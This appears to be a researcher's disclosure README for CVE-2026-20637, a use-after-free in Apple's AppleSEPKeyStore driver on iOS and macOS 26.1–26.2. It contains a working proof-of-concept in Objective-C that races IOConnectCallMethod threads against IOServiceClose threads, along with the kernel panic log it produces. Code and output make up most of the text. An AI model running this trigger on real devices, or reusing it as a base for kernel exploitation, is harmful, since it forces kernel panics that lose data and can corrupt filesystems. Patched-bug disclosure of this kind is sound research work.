# CVE-2026-20637: AppleSEPKeyStore Use-After-Free

**[CVE-2026-20637](https://support.apple.com/en-us/126346)** | Author: [Johnny Franks (@zeroxjf)](https://x.com/zeroxjf)

> **Component:** AppleKeyStore
>
> **Impact:** An app may be able to cause unexpected system termination
>
> **Description:** A use after free issue was addressed with improved memory management.
>
> *— [Apple Security Content, iOS 26.3 and iPadOS 26.3](https://support.apple.com/en-us/126346)*

## Target Versions

| | |
|--|--|
| iOS | 26.1 - 26.2 (tested) |
| macOS | 26.1 - 26.2 (tested) |
| Component | `com.apple.driver.AppleSEPKeyStore` |
| Patched | iOS 26.3 / iPadOS 26.3 |

**Note:** Apple may have gradually patched this between 26.2.1 - 26.3, so it may not work on intermediate versions.

## Warning

**This code WILL crash your device.** Running these tools causes an immediate kernel panic.

- Save all work before running
- Potential for data loss on unsaved files
- Repeated panics may cause filesystem corruption
- Not responsible for boot loops, data loss, or bricked devices
- For security research purposes only

## Vulnerability

Use-after-free in IOCommandGate triggered via AppleKeyStore race condition. 8 caller threads hammer `IOConnectCallMethod` on selectors 0-15 while 4 closer threads race `IOServiceClose`, creating a window where the command gate is accessed after being freed.

## Proof of Concept

```objc
#define AKS_SERVICE_NAME "AppleKeyStore"
#define NUM_CALLERS 8
#define NUM_CLOSERS 4
#define NUM_ITERATIONS 100000

static _Atomic(io_connect_t) g_conn = IO_OBJECT_NULL;

// 8 caller threads: hammer IOConnectCallMethod (high priority)
while (!done) {
    io_connect_t conn = atomic_load(&g_conn);
    if (conn == IO_OBJECT_NULL) continue;
    for (uint32_t sel = 0; sel < 16; sel++) {
        IOConnectCallMethod(conn, sel, scalars, 6, NULL, 0, NULL, NULL, NULL, NULL);
    }
}

// 4 closer threads: race IOServiceClose (high priority)
while (!done) {
    io_connect_t conn = atomic_load(&g_conn);
    if (conn == IO_OBJECT_NULL) continue;
    IOServiceClose(conn);
    atomic_store(&g_conn, IO_OBJECT_NULL);
}

// Main thread: 100k connections, no delay
for (int i = 0; i < NUM_ITERATIONS; i++) {
    uint32_t type = (i % 4 == 0) ? 0x2022 : (i % 4 == 1) ? 0xbeef : (i % 4 == 2) ? 0x1337 : 0x4141;
    IOServiceOpen(svc, mach_task_self(), type, &conn);
    atomic_store(&g_conn, conn);
    // NO DELAY - tight race window
}
```

## Panic Log

```
panic(cpu 4 caller 0xfffffff015b84ae0): [iokit.IOCommandGate]: element modified after free
  (off:72, val:0xfffffffffffffe00, sz:80, ptr:0xffffffe69b7d0db0)
   72: 0xfffffffffffffe00

Kernel version: Darwin Kernel Version 25.1.0: Thu Oct 23 11:09:22 PDT 2025;
  root:xnu-12377.42.6~55/RELEASE_ARM64_T8030

Panicked task 0xffffffe5b4f1e820: pid 956: Test

Kernel Extensions in backtrace:
   com.apple.driver.AppleSEPKeyStore(2.0)[AD3CDADB-06B6-32F5-9E47-9889901353CA]
      @0xfffffff016a47020->0xfffffff016a84f9f
```
